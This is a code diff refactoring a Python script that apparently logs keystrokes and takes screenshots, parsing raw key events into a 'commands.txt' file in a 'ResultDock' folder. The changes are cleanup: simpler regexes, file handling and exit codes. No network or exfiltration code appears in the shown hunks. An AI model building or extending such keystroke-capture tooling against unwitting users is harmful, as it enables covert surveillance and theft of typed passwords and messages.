@@ -1,3 +1,4 @@
+# pylint: disable=E0401
 """ Import built-in modules """
 import re
 import sys
@@ -83,7 +84,7 @@ def regex_formatting(path: Path):
     :return:  Nothing
     """
     # Compile parsing patterns #
-    regex = re.compile(r'(?:(^\[)|([\',])|(]$))')
+    regex = re.compile(r'(^\[)|([\',])|(]$)')
     regex2 = re.compile(r'''<Key\.
                             (?:ctrl|shift|alt|caps_lock|
                             tab|cmd|home|insert|delete|
@@ -98,26 +99,23 @@ def regex_formatting(path: Path):
     regex4 = re.compile(r'<Key\.backspace:<\d+>>')
     regex5 = re.compile(r'<Key\.space:>')
     cmd_path = file_path / 'commands.txt'
-
-    # Open un-formatted file #
     try:
-        with path.open('r', encoding='utf-8') as parse_file:
+        # Open the raw output and the file where the formatted output will go #
+        with path.open('r', encoding='utf-8') as parse_file, \
+        cmd_path.open('a', encoding='utf-8') as final_log:
             # Iterate line by line #
             for line in parse_file:
                 # Perform a series of parsing substitutions #
                 sub = re.sub(regex, r'', str(line))
-                sub2 = re.sub(regex2, r'', str(sub))
-                sub3 = re.sub(regex3, r'', str(sub2))
-                sub4 = re.sub(regex4, r'', str(sub3))
-                result = re.sub(regex5, r' ', str(sub4))
-
-                # Open the result command log file #
-                with cmd_path.open('a', encoding='utf-8') as final_log:
-                    # Write parsed result to file #
-                    final_log.write(result)
+                sub = re.sub(regex2, r'', str(sub))
+                sub = re.sub(regex3, r'', str(sub))
+                sub = re.sub(regex4, r'', str(sub))
+                result = re.sub(regex5, r' ', str(sub))
+                # Write parsed result to file #
+                final_log.write(result)
 
     # If error occurs during file operation #
-    except (IOError, OSError) as file_err:
+    except OSError as file_err:
         # Print error and exit #
         print_err(f'Error occurred during regex parsing file operation: {file_err}')
         sys.exit(3)
@@ -149,7 +147,7 @@ def main():
             SCREENSHOT.join(timeout=600)
 
     # If error occurs during file operation #
-    except (IOError, OSError) as file_err:
+    except OSError as file_err:
         # Print error and exit #
         print_err(f'Error occurred during file operation logging keys: {file_err}')
         sys.exit(2)
@@ -170,13 +168,14 @@ def print_err(msg: str):
 
 
 if __name__ == '__main__':
+    RET = 0
     # List for recording key presses #
     KEYS = []
     # Get the current working directory #
-    cwd = Path('.')
+    cwd = Path.cwd()
     file_path = cwd / 'ResultDock'
     # Create storage directory #
-    Path(str(file_path.resolve())).mkdir(parents=True, exist_ok=True)
+    file_path.mkdir(parents=True, exist_ok=True)
 
     try:
         main()
@@ -188,6 +187,6 @@ if __name__ == '__main__':
     # If unknown system exception occurs #
     except Exception as ex:
         print_err(f'Unknown exception occurred: {ex}')
-        sys.exit(1)
+        RET = 1
 
-    sys.exit(0)
+    sys.exit(RET)
